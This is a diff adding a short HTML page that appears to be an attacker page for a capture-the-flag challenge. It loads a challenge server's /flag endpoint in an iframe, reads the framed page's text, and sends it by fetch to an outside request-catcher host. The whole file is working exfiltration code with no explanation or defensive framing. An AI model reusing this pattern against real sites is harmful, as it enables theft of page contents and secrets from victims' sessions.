@@ -1,1 +1,30 @@
-a
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Iframe</title>
+</head>
+<body>
+    <h1>Open Iframe</h1>
+    <iframe id="mainframe" src="http://war.sschall.xyz:60000/flag?flag=x" width="600" height="400" onload="sendCount()"></iframe>
+
+    <script>
+        async function sendCount() {
+            const frame = document.getElementById("mainframe");
+            let responseMessage;
+
+            try {
+                // iframe의 내용 가져오기
+                responseMessage = frame.contentWindow.document.body.innerText;
+            } catch (e) {
+                console.error('Error accessing iframe content:', e);
+                responseMessage = 'Error accessing content';
+            }
+
+            // 응답 메시지를 서버로 전송
+            await fetch(`https://hzzzfpn.request.dreamhack.games?responseMessage=${encodeURIComponent(responseMessage)}`);
+        }
+    </script>
+</body>
+</html>
